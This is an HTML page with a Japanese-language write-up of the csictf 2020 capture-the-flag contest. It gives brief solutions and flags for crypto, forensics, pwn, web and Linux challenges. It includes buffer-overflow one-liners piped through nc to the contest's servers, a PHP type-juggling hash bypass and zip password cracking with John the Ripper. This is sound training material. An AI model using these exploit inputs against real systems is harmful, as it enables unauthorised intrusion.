@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>csictf 2020 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.72.0 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/csictf_2020/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="https://captureamerica.github.io/writeups/dist/even.c2a46f00.min.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="csictf 2020 Writeup" />
+<meta property="og:description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/csictf_2020/" />
+<meta property="article:published_time" content="2020-07-22T13:00:00+09:00" />
+<meta property="article:modified_time" content="2020-07-22T13:00:00+09:00" />
+<meta itemprop="name" content="csictf 2020 Writeup">
+<meta itemprop="description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も">
+<meta itemprop="datePublished" content="2020-07-22T13:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2020-07-22T13:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="1678">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="csictf 2020 Writeup"/>
+<meta name="twitter:description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">csictf 2020 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-07-22 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#crypto-rivest-shamir-adleman">[Crypto]: Rivest Shamir Adleman</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-gradient-sky">[forensics]: Gradient sky</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-archenemy">[Forensics]: Archenemy</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-panda">[Forensics]: Panda</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-pwn-intended-0x1">[Pwn]: pwn intended 0x1</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-pwn-intended-0x2">[Pwn]: pwn intended 0x2</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-pwn-intended-0x3">[Pwn]: pwn intended 0x3</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-cascade">[Web]: Cascade</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-warm-up">[Web]: Warm Up</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-mr-rami">[Web]: Mr Rami</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux-aka">[Linux]: AKA</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux-find32">[Linux]: find32</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fcsi_ctf_2020%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://ctf.csivit.com/challenges">https://ctf.csivit.com/challenges</a></p>
+<p><br />
+最終順位は、319位でした。</p>
+<img src="https://captureamerica.github.io/writeups/img/csictf_2020_Score0.png" alt="csictf_2020_Score0.png">
+<p><br /></p>
+<img src="https://captureamerica.github.io/writeups/img/csictf_2020_Score1.png" alt="csictf_2020_Score1.png">
+<p><br /></p>
+<p>日曜日にだけやったので、その後に追加された分は見れてません。</p>
+<p>以下、Discordにあった情報ですが、58個もチャレンジがあったみたいです。現時点で、すでにチャレンジ一覧は見れません。。</p>
+<img src="https://captureamerica.github.io/writeups/img/csictf_2020_Discord.png" alt="csictf_2020_Discord.png">
+<p><br /><br /></p>
+<h2 id="crypto-rivest-shamir-adleman">[Crypto]: Rivest Shamir Adleman</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>These 3 guys encrypted my flag, but they didn&rsquo;t tell me how to decrypt it.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>enc.txt</li>
+</ul>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>RsaCtfTool.pyで解けるRSAの問題でした。NをFactorizeしてから実行しました。</p>
+<p><br /></p>
+<p>Flag: <code>csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-gradient-sky">[forensics]: Gradient sky</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Gradient sky is a begginer level ctf challenge which is aimed towards rookies.
+<br /></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>sky.jpg</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>stringsコマンドで解ける問題でした。</p>
+<p><br /></p>
+<p>Flag: <code>csictf{j0ker_w4snt_happy}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-archenemy">[Forensics]: Archenemy</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>John likes Arch Linux. What is he hiding?
+<br /></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>arched.png</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>$ foremost</p>
+<p>$ steghide extract -sf 00000000.jpg</p>
+<p>$ zip2john flag.zip &gt; hash.txt</p>
+<p>$ john hash.txt &ndash;wordlist=/usr/share/wordlists/rockyou.txt</p>
+<p><br /></p>
+<p>Flag: <code>csictf{1_h0pe_y0u_don't_s33_m3_here}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-panda">[Forensics]: Panda</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>I wanted to send this file to AJ1479 but I did not want anyone else to see what&rsquo;s inside it, so I protected it with a pin.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>panda.zip</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>$ zip2johnとjohnを使ってzipを解凍すると（パスワード: 2611）、２つのjpgファイルが出てきます。</p>
+<p>サイズが全く同じであるため、バイナリの比較を取ってみたところ、フラグが見つかりました。</p>
+<pre>
+$ ls -al
+-rw-r--r--  1 captureamerica captureamerica  78034 Jul  6 03:58 panda1.jpg
+-rw-r--r--  1 captureamerica captureamerica  78034 Jul  6 03:57 panda.jpg
+
+$ cmp -bl panda.jpg panda1.jpg 
+  265  63 3    143 c
+  266 142 b    163 s
+  267 162 r    151 i
+ 7844 123 S    143 c
+ 7845 333 M-[  164 t
+ 7846 314 M-L  146 f
+ 7847 103 C    173 {
+22173 315 M-M  153 k
+22174 362 M-r  165 u
+22175 301 M-A  156 n
+25751  27 ^W   147 g
+25752 150 h    137 _
+42013 147 g    146 f
+42014 355 M-m  165 u
+42015 152 j    137 _
+46084 151 i    160 p
+46085  44 $     64 4
+46086 142 b    156 n
+46087 111 I    144 d
+46088 354 M-l   64 4
+46089 331 M-Y  175 }
+
+$ cmp -bl panda.jpg panda1.jpg | rev | cut -c 1 | tr -d "\n" ; echo
+csictf{kung_fu_p4nd4}
+</pre>
+<p><br /></p>
+<p>Flag: <code>csictf{kung_fu_p4nd4}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-pwn-intended-0x1">[Pwn]: pwn intended 0x1</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>I really want to have some coffee!
+<br /><br />
+nc chall.csivit.com 30001</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>pwn-intended-0x1</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<pre>
+$ (python -c 'print("A"*48)' ; cat - ) | nc chall.csivit.com 30001
+Please pour me some coffee:
+
+Thanks!
+
+Oh no, you spilled some coffee on the floor! Use the flag to clean it.
+csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
+</pre>
+<p><br /></p>
+<p>Flag: <code>csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-pwn-intended-0x2">[Pwn]: pwn intended 0x2</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>Travelling through spacetime!
+<br /><br />
+nc chall.csivit.com 30007</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>pwn-intended-0x2</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<pre>
+$ (python -c 'print("A"*44)+"\xbe\xba\xfe\xca\x00\x00\x00\x00"' ; cat - ) | nc chall.csivit.com 30007
+Welcome to csictf! Where are you headed?
+Safe Journey!
+You've reached your destination, here's a flag!
+csictf{c4n_y0u_re4lly_telep0rt?}
+</pre>
+<p><br /></p>
+<p>Flag: <code>csictf{c4n_y0u_re4lly_telep0rt?}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-pwn-intended-0x3">[Pwn]: pwn intended 0x3</h2>
+<hr>
+<h3 id="challenge-6">Challenge</h3>
+<blockquote>
+<p>Teleportation is not possible, or is it?
+<br /><br />
+nc chall.csivit.com 30013</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>pwn-intended-0x3</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-6">Solution</h3>
+<pre>
+$ (python -c 'print("A"*40)+"\xce\x11\x40\x00\x00\x00\x00\x00"' ; cat - ) | nc chall.csivit.com 30013
+Welcome to csictf! Time to teleport again.
+Well, that was quick. Here's your flag:
+csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
+</pre>
+<p><br /></p>
+<p>Flag: <code>csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-cascade">[Web]: Cascade</h2>
+<hr>
+<h3 id="challenge-7">Challenge</h3>
+<blockquote>
+<p>Welcome to csictf.
+<br /><br />
+<a href="http://chall.csivit.com:30203">http://chall.csivit.com:30203</a></p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-7">Solution</h3>
+<p>style.cssの中にフラグが入っていました。</p>
+<p><br /></p>
+<p>Flag: <code>csictf{w3lc0me_t0_csictf}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-warm-up">[Web]: Warm Up</h2>
+<hr>
+<h3 id="challenge-8">Challenge</h3>
+<blockquote>
+<p>If you know, you know; otherwise you might waste a lot of time.
+<br /><br />
+<a href="http://chall.csivit.com:30272">http://chall.csivit.com:30272</a></p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-8">Solution</h3>
+<p>上記にアクセスすると、以下のコードが表示されます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;10932435112&#34;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not so easy mate.&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]);</span>
+    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="mi">10932435112</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="nv">$target</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+        <span class="k">print</span> <span class="nv">$flag</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&#34;csictf{loser}&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+Hashコリジョン系のチャレンジのようです。10932435112とか、0e07766915004133176347055865026311692244（10932435112のsha1）でひらすらググると、以下の情報が見つかりました。</p>
+<pre>
+var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
+</pre>
+<p><br /></p>
+<p>以下のURLでアクセスするとフラグがもらえました。</p>
+<p><a href="http://chall.csivit.com:30272/?hash=aaroZmOk">http://chall.csivit.com:30272/?hash=aaroZmOk</a></p>
+<p><br /></p>
+<p>Flag: <code>csictf{typ3_juggl1ng_1n_php}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-mr-rami">[Web]: Mr Rami</h2>
+<hr>
+<h3 id="challenge-9">Challenge</h3>
+<blockquote>
+<p>&ldquo;People who get violent get that way because they can’t communicate.&rdquo;
+<br /><br />
+<a href="http://chall.csivit.com:30231">http://chall.csivit.com:30231</a></p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-9">Solution</h3>
+<p>robots.txtを参照して、<a href="http://chall.csivit.com:30231/fade/to/black">http://chall.csivit.com:30231/fade/to/black</a> にアクセスするだけです。</p>
+<p><br /></p>
+<p>Flag: <code>csictf{br0b0t_1s_pr3tty_c00l_1_th1nk}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="linux-aka">[Linux]: AKA</h2>
+<hr>
+<h3 id="challenge-10">Challenge</h3>
+<blockquote>
+<p>Cows are following me everywhere I go. Help, I&rsquo;m trapped!
+<br /><br />
+nc chall.csivit.com 30611</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-10">Solution</h3>
+<p>どうやら禁止されているコマンドを実行するとcowsayが走る、みたいなやつです。以下にあるように、xxdなんかは、cowsayが走りませんでした。</p>
+<pre>
+$ nc chall.csivit.com 30611
+user @ csictf: $ 
+cat flag.txt
+ ________________________________________
+/ Don't look at me, I'm just here to say \
+\ moo. flag.txt                          /
+ ----------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+
+user @ csictf: $ 
+xxd flag.txt
+user @ csictf: $ 
+find .
+ ________________________________________
+/ Don't look at me, I'm just here to say \
+\ moo. .                                 /
+ ----------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+
+</pre>
+<p><br />
+tacコマンドで取れました。</p>
+<pre>
+user @ csictf: $ 
+tac flag.txt
+csictf{1_4m_cl4rk3_k3nt}
+</pre>
+<p><br /></p>
+<p>Flag: <code>csictf{1_4m_cl4rk3_k3nt}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="linux-find32">[Linux]: find32</h2>
+<hr>
+<h3 id="challenge-11">Challenge</h3>
+<blockquote>
+<p>I should have really named my files better. I thought I&rsquo;ve hidden the flag, now I can&rsquo;t find it myself. (Wrap your flag in csictf{})
+<br /><br />
+ssh <a href="mailto:user1@chall.csivit.com">user1@chall.csivit.com</a> -p 30630 (Password is find32)</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-11">Solution</h3>
+<p>ls -alでファイルの一覧を見ると、ひとつだけサイズの異なるものが見つかります。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="hl"><span class="lnt">11
+</span></span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="n">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
+<span class="n">total</span> <span class="n">4816</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">12288</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">09</span> <span class="o">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="n">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="n">4096</span> <span class="n">Jul</span> <span class="n">19</span> <span class="n">03</span><span class="o">:</span><span class="n">50</span> <span class="o">..</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">02KG7GI3</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">02M95EZJ</span>
+<span class="o">:</span>
+<span class="o">(</span><span class="n">snip</span><span class="o">)</span>
+<span class="o">:</span>
+<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">MIN0CJNB</span>
+<span class="hl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10058</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">MITS1KT3</span>
+</span><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">MLNCZNJH</span>
+<span class="o">:</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>MITS1KT3の中身を確認すると、<code>csictf{not_the_flag}{user2:AAE976A5232713355D58584CFE5A5}</code> というのが見つかります。</p>
+<p>user2にsuして、ホームにあるファイルをチェックします。</p>
+<pre>
+$ su user2
+Password: 
+
+user2@find32-55bc4b84d5-9gcbl:/user1$ whoami
+user2
+
+user2@find32-55bc4b84d5-9gcbl:/user1$ ls -al
+ls: cannot open directory '.': Permission denied
+
+user2@find32-55bc4b84d5-9gcbl:/user1$ cd
+
+user2@find32-55bc4b84d5-9gcbl:~$ pwd
+/user2
+
+user2@find32-55bc4b84d5-9gcbl:~$ ls -al
+total 3708
+drwxr-x--- 1 root user2   4096 Jul 17 23:09 .
+drwxr-xr-x 1 root root    4096 Jul 19 03:50 ..
+-rwxr-x--- 1 root user2 756782 Jul 17 23:08 adgsfdgasf.d
+-rwxr-x--- 1 root user2 756782 Jul 17 23:08 fadf.x
+-rwxr-x--- 1 root user2 756782 Jul 17 23:08 janfjdkn.txt
+-rwxr-x--- 1 root user2 756782 Jul 17 23:08 notflag.txt
+-rwxr-x--- 1 root user2 756798 Jul 17 23:08 sadsas.tx
+
+</pre>
+<p><br /></p>
+<p>ここで、sadsas.tx だけ少しサイズが大きいので、このファイルにフラグが入っていると予想。</p>
+<pre>
+user2@find32-55bc4b84d5-9gcbl:~$ diff adgsfdgasf.d sadsas.tx 
+42391a42392
+> th15_15_unu5u41
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>csictf{th15_15_unu5u41}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2020-07-22
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/rgb_ctf_2020/">
+            <span class="next-text nav-default">RGB CTF 2020 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/dist/even.26188efa.min.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
